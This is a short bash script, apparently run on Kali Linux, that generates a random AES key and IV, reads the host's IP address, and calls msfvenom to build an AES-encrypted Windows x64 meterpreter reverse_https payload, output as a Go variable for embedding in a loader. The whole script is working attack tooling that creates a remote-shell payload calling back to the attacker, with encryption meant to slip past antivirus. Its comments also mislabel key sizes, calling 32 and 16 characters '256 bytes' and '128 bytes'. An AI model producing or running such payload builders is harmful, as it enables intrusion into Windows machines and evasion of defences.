# Runned on Kali Linux
#!/bin/bash

aesEncryptionKey=$(echo $RANDOM | md5sum | head -c 32)	# 256 bytes
aesInitialVector=$(echo $RANDOM | md5sum | head -c 16)	# 128 bytes
echo "Encryption Key: $aesEncryptionKey"
echo "Initial Vector: $aesInitialVector"

currentHostIP=$(ifconfig | grep -oE 'inet (addr:)?([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)' | awk '{print $2}' | head -n 1)
echo "Host IP: $currentHostIP"

msfvenom -p windows/x64/meterpreter/reverse_https --encrypt aes256 --encrypt-key $aesEncryptionKey --encrypt-iv $aesInitialVector lhost=$currentHostIP lport=443 --platform win --arch=x64 exitfunc=thread --format go --var-name bufEncrypted
